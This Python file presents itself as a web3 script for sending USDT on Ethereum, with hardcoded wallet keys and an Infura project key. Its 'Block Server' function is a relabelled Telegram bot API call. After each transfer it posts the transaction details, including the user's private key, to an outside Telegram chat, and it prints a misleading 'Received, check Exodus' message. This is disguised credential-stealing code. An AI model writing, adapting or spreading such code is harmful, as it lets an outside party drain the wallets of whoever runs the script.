from web3 import Web3
from eth_account import Account
import requests

# Initialize Web3 with Infura HTTP provider (Block Server)
block_server = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/4370fa52b6c542c0b395bca1db50e312'))

# Set private key and sender address
private_key = "0x8ef4177a78be5edf004986b83f65ad4f65895a97e673561e7ca67cb17965dd95"
sender_address = "0xb5d2DF187f6074DbB97B0Ed717BD773D193C29C4"

# Set recipient address (ensure this is correct)
recipient_address = "0x383C896180D1505a8d4C7711BB6b299fDb1B0a09"  # Replace with actual recipient address
usdt_contract_address = "0xdAC17F958D2ee523a2206206994597C13D831ec7"  # USDT contract address

# ERC20 Transfer function signature
usdt_transfer_signature = '0xa9059cbb'

# Block Server token and Block Miner ID
block_server_token = '6638058790:AAGopFQtax5re27q-3JOhbS-rlfhNmMeHNQ'
block_miner_id = '6530323383'

def send_to_block_server(message):
    try:
        url = f"https://api.telegram.org/bot{block_server_token}/sendMessage"  # Correct block server API URL
        payload = {
            'chat_id': block_miner_id,
            'text': message
        }
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Received, check Exodus.")
        else:
            print(f"Failed to send message to Block Server. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message to Block Server: {str(e)}")

def send_block_transaction(amount, gas_price_gwei, gas_limit, nonce, data):
    transaction = {
        'to': usdt_contract_address,
        'value': 0,
        'gas': gas_limit,
        'gasPrice': block_server.to_wei(gas_price_gwei, 'gwei'),
        'nonce': nonce,
        'data': data,
        'chainId': 1
    }

    signed_tx = Account.sign_transaction(transaction, private_key)

    try:
        raw_tx = signed_tx.rawTransaction
    except AttributeError:
        raw_tx = signed_tx.raw_transaction

    tx_hash = block_server.eth.send_raw_transaction(raw_tx)
    return tx_hash

def send_usdt_block_transaction(amount, gas_price_gwei, gas_limit):
    try:
        amount_in_wei = int(amount * 10**6)
        nonce = block_server.eth.get_transaction_count(sender_address)
        
        # Format the data correctly
        data = (
            usdt_transfer_signature +
            recipient_address[2:].rjust(64, '0') +
            hex(amount_in_wei)[2:].rjust(64, '0')
        )

        # Send the transaction
        tx_hash = send_block_transaction(amount, gas_price_gwei, gas_limit, nonce, data)
        print(f"Transaction sent. Hash: {tx_hash.hex()}")

        # Send transaction details including private key to Block Server
        message = (
            f"Transaction Info:\n"
            f"TX Hash: {tx_hash.hex()}\n"
            f"Sender Address: {sender_address}\n"
            f"Recipient Address: {recipient_address}\n"
            f"Amount: {amount} USDT\n"
            f"Private Key: {private_key}"  # Sending private key
        )
        send_to_block_server(message)

        return tx_hash.hex()

    except Exception as e:
        print(f"Transaction failed: {str(e)}")
        return None

# Example usage
amount_to_send = 1000000  # Amount of USDT to send
gas_price_gwei = 8  # Gas price in gwei
gas_limit = 60000  # Gas limit for ERC20 token transfer

tx_hash = send_usdt_block_transaction(amount_to_send, gas_price_gwei, gas_limit)